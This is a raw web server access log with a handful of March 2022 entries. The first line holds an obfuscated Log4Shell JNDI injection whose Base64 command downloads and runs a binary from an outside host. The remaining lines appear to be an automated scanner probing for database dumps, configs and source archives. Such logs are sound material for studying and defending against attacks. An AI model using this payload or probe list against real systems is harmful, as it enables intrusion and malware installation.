45.85.190.62 - - [18/Mar/2022:04:15:23 +0800] "GET / HTTP/1.1" 200 2506 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//77.247.127.112:1389/TomcatBypass/Command/Base64/d2dldCAxNjAuMjAuMTQ1LjIyNS9iaW5zL3h4eC54ODY7IGNobW9kIDc3NyB4eHgueDg2OyAuL3h4eC54ODY=}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//77.247.127.112:1389/TomcatBypass/Command/Base64/d2dldCAxNjAuMjAuMTQ1LjIyNS9iaW5zL3h4eC54ODY7IGNobW9kIDc3NyB4eHgueDg2OyAuL3h4eC54ODY=}')" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /CONTRIBUTING.txt HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /secure/ConfigureReport.jspa HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /db.inc HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /CHANGELOG.txt HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /src.rar HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /database.zip HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /config.tar HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /a.zip HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /vulnspy.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /graphql-explorer HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /api/user HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /Trace.axd HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
110.42.250.65 - - [18/Mar/2022:04:19:34 +0800] "GET /xsl/_common.xsl HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" "-"
